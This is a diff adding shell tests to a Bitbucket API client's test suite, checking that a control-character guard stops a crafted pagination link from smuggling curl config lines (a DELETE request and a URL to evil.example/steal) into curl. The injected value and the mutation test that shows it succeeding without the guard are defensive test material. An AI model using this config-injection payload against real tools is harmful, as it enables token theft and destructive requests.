@@ -368,6 +368,16 @@ check "a reply cycle prints unknown, not a hang" unknown "$(runbb "$tmp/bb-c")"
 bbcase; jq '.next = "https://evil.example/2.0/x?pagelen=100&page=2"' "$tmp/bb-ok/page1.json" > "$tmp/bb-c/page1.json"
 check "a next link off api.bitbucket.org prints unknown" unknown "$(runbb "$tmp/bb-c")"
 check "and the token is never sent there" 0 "$(grep -c 'evil.example' "$tmp/bb-calls")"
+# A next value that embeds a newline and curl config lines passes the host
+# prefix; without the control-character guard those lines reach curl -K -.
+INJ_NEXT=$'https://api.bitbucket.org/2.0/x"\nrequest = "DELETE"\nurl = "https://evil.example/steal'
+bbcase; jq --arg n "$INJ_NEXT" '.next = $n' "$tmp/bb-ok/page1.json" > "$tmp/bb-c/page1.json"
+check "a next link carrying a newline and config lines prints unknown" unknown "$(runbb "$tmp/bb-c")"
+check "and the injected config never reaches curl" 0 "$(grep -c 'evil.example\|^request = ' "$tmp/bb-calls")"
+grep -vF '[[:cntrl:]]' "$tmp/bb.sh" > "$tmp/bb-mut4.sh"
+check "M11: the mutation removed the control-character guard" 0 "$(grep -cF '[[:cntrl:]]' "$tmp/bb-mut4.sh")"
+check "M11: without the guard the injected config reaches curl" 1 \
+    "$(mv "$tmp/bb.sh" "$tmp/bb.sh.real"; cp "$tmp/bb-mut4.sh" "$tmp/bb.sh"; runbb "$tmp/bb-c" >/dev/null; mv "$tmp/bb.sh.real" "$tmp/bb.sh"; grep -c '^request = "DELETE"' "$tmp/bb-calls" | awk '{print ($1 > 0)}')"
 check "a missing token prints unknown, with no request made" "unknown 0" "$(o="$(BB_NO_TOKEN=1 runbb "$tmp/bb-ok")"; echo "$o $(grep -c . "$tmp/bb-calls")")"
 git -C "$tmp/bbrepo" remote set-url origin https://github.com/acme/app.git
 check "an origin that is not Bitbucket prints unknown" unknown "$(runbb "$tmp/bb-ok")"
